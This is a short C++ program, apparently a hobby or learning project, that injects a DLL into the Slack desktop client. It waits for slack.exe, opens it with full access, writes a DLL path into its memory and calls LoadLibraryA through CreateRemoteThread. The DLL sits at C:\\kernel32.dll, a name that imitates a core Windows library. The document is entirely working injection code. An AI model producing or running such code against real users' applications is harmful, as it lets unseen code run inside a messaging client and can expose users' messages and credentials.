#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>  //win32 header, to be loaded after windows.h | Used to get inmemory snapshots


DWORD GetProcId(const char* procName)  //Function to get processID
{
    DWORD procId = 0; //Define
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  //Get snapshot of heap, memory etc. | Get snapshots of all process in sys

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry; //Get process from snapshot
        procEntry.dwSize = sizeof(procEntry); //Get process name

        if (Process32First(hSnap, &procEntry)) //Function to Get first process from snap and compare | If found break else move to next process from list
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap); //Close Handle hsnap
    return procId; //Return process ID
}
int main()
{
    const char* dllPath = "C:\\kernel32.dll"; //Define dll path
    const char* procName = "slack.exe"; //Define process path
    DWORD procId = 0; //Define procID

    while (!procId)
    {
        procId = GetProcId(procName); //Call function if process not found | sleep 60 and repeat
        Sleep(60);
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId); //Openprocess(Access needed, Boolean to inheart handle, process ID defined)

    if (hProc && hProc != INVALID_HANDLE_VALUE)
    {
        void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //This is used to reserve memory, void causes it does not returns anything | (Handle to process, Where to commit in memory If null, the process determines where to allocate, Size of memory to commit, here Maximum available is used, Allocation of mem | Here Reserve and commit in one step, memory protection)

        if (loc)
        {
            WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0); //Write data to reseve memory | (handle to process, base address to where changes are to be made, data to be written, number of bytes to be written to specific proces, ignored param) 
        }


        HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0); //Create thread in process | (Handle to process thread to be created, security attributes | Null means default, size of stack | Null means default used by process, Determines starting address in mem space and load specific module in mem space, pointer of variable to be passed, 0 means thread runs instant, no return thread identifier)

        if (hThread)
        {
            CloseHandle(hThread); //Sanity 
        }
    }
    if (hProc)
    {
        CloseHandle(hProc); //Sanity 
    }
    return 0;

}
    



